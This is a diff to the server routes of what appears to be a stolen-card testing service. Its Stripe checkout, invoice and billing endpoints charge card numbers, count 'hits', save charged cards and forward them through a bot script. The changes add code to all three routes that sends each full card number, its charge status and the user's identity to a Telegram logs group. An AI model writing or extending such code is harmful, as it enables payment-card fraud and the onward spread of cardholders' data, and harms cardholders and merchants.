@@ -2540,17 +2540,18 @@ export async function registerRoutes(
       const data = JSON.parse(jsonLine);
       if (data.error) return res.status(400).json({ error: data.error });
 
+      const cardClean = card.replace(/\|/g, "|");
+      const userName = [req.session?.firstName, req.session?.lastName].filter(Boolean).join(" ") || req.session?.userId || "";
+
       if (data.status === "charged" && req.session?.userId) {
         const botDir2 = path.resolve(process.cwd(), "bot");
         const forwardScript = path.join(botDir2, "web_forward_hit.py");
-        const cardClean = card.replace(/\|/g, "|");
         const freshCache = data.session_cache || {};
         const merchantName = freshCache.merchant || (sessionCache as any)?.merchant || "";
         const rawAmount = freshCache.amount ?? (sessionCache as any)?.amount;
         const rawCurrency = (freshCache.currency || "").toUpperCase();
         const zeroDecimalCurrencies = ["BIF","CLP","DJF","GNF","JPY","KMF","KRW","MGA","PYG","RWF","UGX","VND","VUV","XAF","XOF","XPF"];
         const amount = (rawAmount != null && rawAmount !== "") ? `${zeroDecimalCurrencies.includes(rawCurrency) ? rawAmount : (Number(rawAmount) / 100).toFixed(2)} ${rawCurrency}` : "";
-        const userName = [req.session.firstName, req.session.lastName].filter(Boolean).join(" ") || req.session.userId;
         const successUrl = freshCache.success_url || (sessionCache as any)?.success_url || "";
         const adminSite = (() => { try { return successUrl ? new URL(successUrl.replace(/\{[^}]+\}/g, "x")).hostname.replace(/^www\./, "") : ""; } catch { return ""; } })();
 
@@ -2573,6 +2574,8 @@ export async function registerRoutes(
         });
       }
 
+      const coLogStatus = data.status === "charged" ? "CHARGED" : data.status === "approved" ? "APPROVED" : data.status === "live" ? "3DS" : "DECLINED";
+      sendLogsGroupTelegram(cardClean, "Stripe CO", data.message || data.status || "", coLogStatus, userName, req.session?.userId || "");
       res.json(data);
     } catch (err: any) {
       res.status(500).json({ error: err.message || "Stripe CO failed" });
@@ -2684,17 +2687,18 @@ export async function registerRoutes(
       const data = JSON.parse(jsonLine);
       if (data.error) return res.status(400).json({ error: data.error });
 
+      const cardClean = card.replace(/\|/g, "|");
+      const userName = [req.session?.firstName, req.session?.lastName].filter(Boolean).join(" ") || req.session?.userId || "";
+
       if (data.status === "charged" && req.session?.userId) {
         const botDir2 = path.resolve(process.cwd(), "bot");
         const forwardScript = path.join(botDir2, "web_forward_hit.py");
-        const cardClean = card.replace(/\|/g, "|");
         const freshCache = data.session_cache || {};
         const merchantName = freshCache.merchant || (sessionCache as any)?.merchant || "";
         const rawAmount = freshCache.amount ?? (sessionCache as any)?.amount;
         const rawCurrency = (freshCache.currency || "").toUpperCase();
         const zeroDecimalCurrencies = ["BIF","CLP","DJF","GNF","JPY","KMF","KRW","MGA","PYG","RWF","UGX","VND","VUV","XAF","XOF","XPF"];
         const amount = (rawAmount != null && rawAmount !== "") ? `${zeroDecimalCurrencies.includes(rawCurrency) ? rawAmount : (Number(rawAmount) / 100).toFixed(2)} ${rawCurrency}` : "";
-        const userName = [req.session.firstName, req.session.lastName].filter(Boolean).join(" ") || req.session.userId;
 
         spawn("python3", ["-u", forwardScript, req.session.userId, cardClean, "Stripe Invoice", data.message || "Charged", userName, merchantName, amount, invoiceUrl, ""], {
           cwd: botDir2,
@@ -2715,6 +2719,8 @@ export async function registerRoutes(
         });
       }
 
+      const invLogStatus = data.status === "charged" ? "CHARGED" : data.status === "approved" ? "APPROVED" : data.status === "live" ? "3DS" : "DECLINED";
+      sendLogsGroupTelegram(cardClean, "Stripe Invoice", data.message || data.status || "", invLogStatus, userName, req.session?.userId || "");
       res.json(data);
     } catch (err: any) {
       res.status(500).json({ error: err.message || "Stripe Invoice failed" });
@@ -2825,13 +2831,14 @@ export async function registerRoutes(
       const data = JSON.parse(jsonLine);
       if (data.error) return res.status(400).json({ error: data.error });
 
+      const cardClean = card.replace(/\|/g, "|");
+      const userName = [req.session?.firstName, req.session?.lastName].filter(Boolean).join(" ") || req.session?.userId || "";
+
       if ((data.status === "charged" || data.status === "approved") && req.session?.userId) {
         const botDir2 = path.resolve(process.cwd(), "bot");
         const forwardScript = path.join(botDir2, "web_forward_hit.py");
-        const cardClean = card.replace(/\|/g, "|");
         const freshCache = data.session_cache || {};
         const site = freshCache.merchant || sessionCache?.merchant || "";
-        const userName = [req.session.firstName, req.session.lastName].filter(Boolean).join(" ") || req.session.userId;
         const billingResponse = data.message || (data.status === "charged" ? "Charged" : "Approved");
 
         spawn("python3", ["-u", forwardScript, req.session.userId, cardClean, "Stripe Billing", billingResponse, userName, site, "", billingUrl.slice(0, 120)], {
@@ -2843,7 +2850,6 @@ export async function registerRoutes(
 
         incrementUsage(req.session.userId, "hitterHits");
         incrementIpHitterUsage(billingReqIp);
-        const gateName = data.status === "charged" ? "Stripe Billing" : "Stripe Billing (Approved)";
         if (data.status === "charged") {
           saveChargedCC(cardClean, "Stripe Billing", req.session.userId, userName);
         }
@@ -2856,6 +2862,8 @@ export async function registerRoutes(
         });
       }
 
+      const billingLogStatus = data.status === "charged" ? "CHARGED" : data.status === "approved" ? "APPROVED" : data.status === "live" ? "3DS" : "DECLINED";
+      sendLogsGroupTelegram(cardClean, "Stripe Billing", data.message || data.status || "", billingLogStatus, userName, req.session?.userId || "");
       res.json(data);
     } catch (err: any) {
       res.status(500).json({ error: err.message || "Stripe Billing failed" });
